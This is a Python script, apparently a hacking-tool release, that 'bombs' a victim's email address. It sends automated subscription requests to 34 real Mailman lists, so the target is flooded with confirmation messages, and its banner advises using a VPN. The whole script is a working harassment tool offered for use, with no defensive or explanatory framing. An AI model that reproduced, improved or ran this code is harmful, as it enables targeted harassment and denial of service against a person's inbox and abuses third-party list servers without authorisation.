import os
import requests
import time
import random
import sys
def banner():
 os.system("clear")
 os.system("toilet -fmono12 -F border XPLOITS")
 print("    \033[1;36;40m TOOL        : \033[1;32;40m Bombing Mails To Your Victim ")
 print("    \033[1;36;40m Code made by: \033[1;32;40m anonymousmani")
 print("    \033[1;36;40m Inspired by : \033[1;32;40m tuhin bose")
 print("    \033[1;36;40m Instagram id: \033[1;32;40m www.instagram.com/x_ploits")
 print("    \033[1;36;40m Github      : \033[1;32;40m www.github.com/anonymousmani")
 print("    \033[1;31;40m    Use a VPN before it.Otherwise it won't work")
 print("\n\n")
banner() 
spam_id = str(raw_input("\033[1;33;40mEnter the e-mail address of victim:"))
count= int(input("\033[1;33;40mEnter the number of e-mails to be sent(Maximum:34): "))
if(count>34):
 print("\033[1;31;40mYour entered number is >34 .Quiting...")
 time.sleep(1.5)
 sys.exit()
urllist=["http://list.webaim.org/mailman/subscribe/webaim-forum?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-internals?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-news?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://audifans.com/mailman/subscribe/es2?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/offtopic?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/marketplace?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/events?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/staff?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/tt?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/torsen?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://audifans.com/mailman/subscribe/vwdiesel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v6-12v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v8?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/urq?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/av-games?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/sundaynightgames?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs-web?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/india-drug?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-stacey?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/springsource-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/vmwaretest?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/security-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/solutionproviderroundtable?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/quattro?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/jugglefest-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/aow?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-webmaster?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/fusion-enterprise?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe"]

for var in range (0,count):
 url=urllist[var]
 requests.get(url)
 print("\033[1;32;40m")
 print (var+1)," E-mail sent successfully."
 time.sleep(3)
banner()

 













